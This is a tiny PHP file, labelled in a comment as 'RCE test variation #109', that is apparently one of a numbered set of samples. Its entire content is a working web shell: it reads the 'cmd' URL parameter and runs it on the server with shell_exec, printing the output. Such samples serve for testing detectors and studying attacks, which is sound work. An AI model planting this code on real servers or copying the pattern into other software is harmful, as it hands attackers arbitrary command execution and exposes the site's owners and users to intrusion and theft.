<?php
// RCE test variation #109
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>